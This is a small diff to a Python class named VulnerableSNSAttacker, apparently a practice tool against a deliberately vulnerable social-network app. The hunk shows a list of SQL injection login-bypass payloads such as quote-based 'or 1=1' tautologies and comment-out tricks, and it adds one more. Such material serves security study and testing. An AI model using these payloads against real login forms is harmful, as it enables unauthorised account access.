@@ -96,6 +96,7 @@ class VulnerableSNSAttacker:
             ("admin", '" or 1=1 --', 'Double quote numeric OR'),
             ('admin" or "a"="a" --', 'anything', 'Username field injection'),
             ('admin" --', 'anything', 'Comment out password'),
+            ('admin', "' or '1'='1", 'ss'),
         ]
         
         for username, password, desc in payloads:
